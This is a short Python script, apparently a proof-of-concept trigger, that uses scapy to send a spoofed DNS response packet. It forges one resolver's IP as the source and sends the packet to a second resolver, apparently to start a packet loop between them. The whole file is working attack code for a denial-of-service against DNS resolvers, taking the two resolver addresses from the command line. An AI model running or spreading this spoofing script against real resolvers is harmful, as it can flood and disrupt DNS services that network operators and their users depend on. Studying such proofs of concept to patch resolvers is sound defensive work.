from scapy.all import IP, UDP, DNS, send
import sys

def exploit_dns_loop(resolver1_ip, resolver2_ip):
    spoofed_packet = (
        IP(src=resolver1_ip, dst=resolver2_ip)
        / UDP(dport=53)
        / DNS(
            qr=1,
            opcode="QUERY",  # IMPORTANT!!!!!!!
            rd=1,
            qdcount=0,
            ancount=0,
            nscount=0,
            arcount=0,
        )
    )

    spoofed_packet.show()
    send(spoofed_packet, verbose=0)


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python trigger.py <resolver1_ip> <resolver2_ip>")
        print("例如: python trigger.py 192.168.1.10 192.168.1.11")
        sys.exit(1)
    resolver_b_ip = sys.argv[1]
    resolver_a_ip = sys.argv[2]

    exploit_dns_loop(resolver_b_ip, resolver_a_ip)